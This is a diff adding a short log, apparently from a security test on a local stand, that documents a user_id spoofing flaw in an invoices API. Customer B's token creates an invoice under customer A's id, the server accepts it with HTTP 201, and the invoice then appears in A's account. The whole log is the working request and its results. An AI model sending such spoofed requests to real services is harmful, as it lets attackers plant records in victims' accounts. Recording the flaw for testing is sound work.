@@ -1,0 +1,9 @@
+# user_id spoofing check (API, local stand, 2026-11-04 00:02)
+# Customer A (victim) id=12, customer B (attacker) id=13. Request sent with B's token and user_id=12:
+POST /invoices  Authorization: Bearer <token of B>  body: {"user_id":12,"billing_address":"Attacker Street 9","billing_city":"Amsterdam","billing_state":"NH","billing_country":"NL","billing_postcode":"1011AA","payment_method":"Cash on Delivery","payment_account_name":"Attacker","payment_account_number":"1","total":17.75,"invoice_items":[{"product_id":10,"quantity":1,"unit_price":17.75}]}
+{"user_id":12,"billing_address":"Attacker Street 9","billing_city":"Amsterdam","billing_state":"NH","billing_country":"NL","billing_postcode":"1011AA","payment_method":"Cash on Delivery","payment_account_name":"Attacker","payment_account_number":1,"total":17.75,"invoice_date":"2026-11-03 23-02-02","invoice_number":"INV-2026000012","id":18}
+HTTP 201
+# GET /invoices/18 as A (victim):
+{'id': 18, 'user_id': 12, 'invoice_number': 'INV-2026000012', 'billing_address': 'Attacker Street 9', 'total': 17.75}
+# Victim's own invoices (filtered by user_id=12):
+[('INV-2026000012', 'Attacker Street 9')]
